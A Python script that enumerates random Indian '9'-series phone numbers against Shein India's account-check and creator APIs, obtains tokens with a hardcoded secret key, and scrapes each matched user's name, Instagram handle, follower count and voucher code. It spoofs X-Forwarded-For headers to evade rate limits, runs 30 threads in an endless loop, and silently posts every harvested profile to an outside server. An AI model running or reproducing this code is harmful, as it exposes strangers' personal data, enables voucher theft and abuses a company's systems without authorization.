import requests
import random
import json
import re
import sys
import logging
import time
import os
import threading
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import Timeout, ConnectionError, HTTPError, RequestException
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# --- Setup and Configuration ---

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO, datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

# --- Remote Server URL Only ---
SAVE_SERVER_URL = "https://api.fojadomain.fun/save_profile"

SECRET_KEY = os.environ.get("SHEIN_SECRET_KEY", "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg")

class SheinCliFetcher:
    def __init__(self):
        # API URLs
        self.client_token_url = "https://api.sheinindia.in/uaas/jwt/token/client"
        self.account_check_url = "https://api.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.0.8"
        self.creator_token_url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token"
        self.profile_url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user"

        self.session = requests.Session()
        
        # --- CACHING VARIABLES ---
        self.cached_client_token = None
        self.token_expiry = 0
        self.lock = threading.Lock()

        # RETRY MECHANISM
        retry_strategy = Retry(
            total=2,
            backoff_factor=2,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "POST", "OPTIONS"]
        )

        adapter = HTTPAdapter(
            pool_connections=100, 
            pool_maxsize=100,
            max_retries=retry_strategy
        )
        
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)

    def get_random_ip(self):
        return ".".join(str(random.randint(0, 255)) for _ in range(4))

    def extract_access_token(self, token_data):
        if isinstance(token_data, dict):
            for key in ['access_token', 'accessToken']:
                if key in token_data: return token_data[key]
            if 'data' in token_data and isinstance(token_data['data'], dict):
                for key in ['access_token', 'accessToken']:
                    if key in token_data['data']: return token_data['data'][key]
        return None

    def get_client_token(self):
        if self.cached_client_token and time.time() < self.token_expiry:
            return self.cached_client_token

        with self.lock:
            if self.cached_client_token and time.time() < self.token_expiry:
                return self.cached_client_token

            headers = {
                'Client_type': 'Android/29', 'Accept': 'application/json', 'Client_version': '1.0.8',
                'User-Agent': 'Android', 'X-Tenant-Id': 'SHEIN', 'Ad_id': '968777a5-36e1-42a8-9aad-3dc36c3f77b2',
                'X-Tenant': 'B2C', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'api.sheinindia.in',
                'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'X-Forwarded-For': self.get_random_ip()
            }
            data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret"

            try:
                response = self.session.post(self.client_token_url, headers=headers, data=data, timeout=15)
                response.raise_for_status()
                json_data = response.json()
                self.cached_client_token = json_data
                self.token_expiry = time.time() + 2700 
                logger.info("🔑 New Client Token Generated & Cached")
                return json_data
            except Exception as e:
                logger.error(f"Error getting client token: {e}")
                return None

    def check_shein_account(self, client_token, phone_number):
        headers = {
            'Authorization': f'Bearer {client_token}', 'Requestid': 'account_check', 'X-Tenant': 'B2C',
            'Accept': 'application/json', 'User-Agent': 'Android', 'Client_type': 'Android/29',
            'Client_version': '1.0.8', 'X-Tenant-Id': 'SHEIN', 'Ad_id': '968777a5-36e1-42a8-9aad-3dc36c3f77b2',
            'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'api.sheinindia.in',
            'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'X-Forwarded-For': self.get_random_ip()
        }
        data = f'mobileNumber={phone_number}'
        try:
            response = self.session.post(self.account_check_url, headers=headers, data=data, timeout=20)
            response.raise_for_status()
            return response.json()
        except HTTPError as e:
            if e.response.status_code == 429:
                time.sleep(2) 
                return None
            return None
        except Exception:
            return None
        
    def get_encrypted_id(self, phone_number):
        try:
            client_token_data = self.get_client_token()
            client_token = self.extract_access_token(client_token_data)
            if not client_token: return None

            account_data = self.check_shein_account(client_token, phone_number)

            if account_data and isinstance(account_data, dict):
                for container in [account_data, account_data.get('data'), account_data.get('result')]:
                    if isinstance(container, dict) and 'encryptedId' in container:
                        return container['encryptedId']
        except Exception:
            pass
        return None

    def get_creator_token(self, phone_number, encrypted_id, user_name="CLI_User"):
        headers = {
            'Accept': 'application/json', 'User-Agent': 'Android', 'Client_type': 'Android/29',
            'Client_version': '1.0.8', 'X-Tenant-Id': 'SHEIN', 'Ad_id': '4d9bbb2c54af468f8130b96dac93362d',
            'Content-Type': 'application/json; charset=UTF-8', 'Host': 'shein-creator-backend-151437891745.asia-south1.run.app',
            'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'X-Forwarded-For': self.get_random_ip()
        }
        data = {
            "client_type": "Android/29", "client_version": "1.0.8", "gender": "male",
            "phone_number": phone_number,
            "secret_key": SECRET_KEY,
            "user_id": encrypted_id, "user_name": user_name
        }
        try:
            response = self.session.post(self.creator_token_url, json=data, headers=headers, timeout=10)
            result = response.json()
            return self.extract_access_token(result)
        except Exception:
            return None

    def get_user_profile(self, access_token):
        headers = {
            'content-type': 'application/json',
            'authorization': f'Bearer {access_token}',
            'X-Forwarded-For': self.get_random_ip()
        }
        try:
            response = self.session.get(self.profile_url, headers=headers, timeout=10)
            return response.json()
        except Exception:
            return None

    def _safe_get_value(self, data_dict, keys, default='N/A'):
        for key in keys:
            value = data_dict.get(key)
            if value is not None and value != '':
                try:
                    if isinstance(value, (int, float)):
                        return str(int(value))
                    return str(value)
                except:
                    pass
        return default

    def format_profile_response(self, profile_data, phone_number):
        try:
            if not profile_data: return None, None, None

            user_data = profile_data.get('user_data', {}) or {}
            user_name = self._safe_get_value(user_data, ['user_name'], default='N/A')
            instagram_data = user_data.get('instagram_data', {}) or {}
            username = self._safe_get_value(instagram_data, ['username', 'user_name'], default='N/A')
            followers_count = self._safe_get_value(instagram_data, ['followers_count', 'follower_count'], default='0')
            voucher_data = user_data.get('voucher_data', {}) or {}
            voucher_code = self._safe_get_value(voucher_data, ['voucher_code'], default='N/A')
            voucher_amount = self._safe_get_value(voucher_data, ['voucher_amount'], default='0')

            structured_data = {
                "phone_number": phone_number,
                "name": user_name,
                "insta_user": username,
                "insta_followers": followers_count,
                "voucher_code": voucher_code,
                "voucher_amount_rs": voucher_amount
            }

            response = f"""
✅ PROFILE FOUND!
  • Phone: {phone_number}
  • Name: {user_name}
  • Insta User: {username}
  • Insta Followers: {followers_count}
🎫 Voucher: {voucher_code} (₹{voucher_amount})"""

            return response, profile_data, structured_data
        except Exception:
            return None, None, None

    def generate_indian_numbers(self, count):
        numbers = []
        # ONLY '9' SERIES NUMBERS
        for _ in range(count):
            first_digit = '9' 
            remaining_digits = ''.join(random.choices('0123456789', k=9))
            numbers.append(first_digit + remaining_digits)
        return numbers

    def process_single_number(self, phone_number):
        # Staggering
        time.sleep(random.uniform(0.5, 4.0)) 
        
        phone_number = ''.join(filter(str.isdigit, phone_number))
        if len(phone_number) != 10: return None

        encrypted_id = self.get_encrypted_id(phone_number)
        if not encrypted_id: return None

        creator_token = self.get_creator_token(phone_number, encrypted_id)
        if not creator_token: return None

        profile_data = self.get_user_profile(creator_token)
        if profile_data:
            return phone_number, profile_data
        return None

# --- REMOTE SAVING LOGIC (NO LOCAL SAVE) ---

def send_to_remote_server(payload):
    """
    Sends profile data to remote server.
    Does not raise exceptions to keep flow smooth.
    """
    try:
        requests.post(SAVE_SERVER_URL, json=payload, timeout=5)
    except Exception:
        # Silent fail as per ultra.py logic
        pass

# --- MAIN ENGINE ---

def main_cli_automation():
    fetcher = SheinCliFetcher()

    MAX_WORKERS = 30 
    BATCH_SIZE = 1500

    total_checked = 0
    found_count = 0

    print("\n" + "#"*60)
    print(f"🚀 Starting HIGH SPEED Mode with {MAX_WORKERS} workers.")
    print(f"   PREFIX FILTER: ONLY '9' SERIES NUMBERS")
    print(f"   LOCAL SAVE: DISABLED (Server Only)")
    print("#"*60 + "\n")

    try:
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            while True:
                numbers_to_test = fetcher.generate_indian_numbers(BATCH_SIZE)
                logger.info(f"--- Processing batch of {BATCH_SIZE} numbers (Starting with 9) ---")

                results = executor.map(fetcher.process_single_number, numbers_to_test)

                for result in results:
                    total_checked += 1
                    if total_checked % 200 == 0:
                        print(f"   >> Checked: {total_checked}...", end='\r')

                    if result:
                        phone_number, profile_data = result
                        formatted_response, _, structured_data = fetcher.format_profile_response(profile_data, phone_number)
                        
                        if structured_data:
                            found_count += 1
                            
                            # Add Timestamp
                            structured_data["timestamp"] = time.strftime("%Y-%m-%d %H:%M:%S")

                            # 1. Local Save -> REMOVED
                            
                            # 2. Save to Remote Server ONLY (Threaded)
                            threading.Thread(target=send_to_remote_server, args=(structured_data,), daemon=True).start()

                            print(formatted_response)

                time.sleep(1)

    except KeyboardInterrupt:
        print("\nStopped.")

if __name__ == "__main__":
    main_cli_automation()
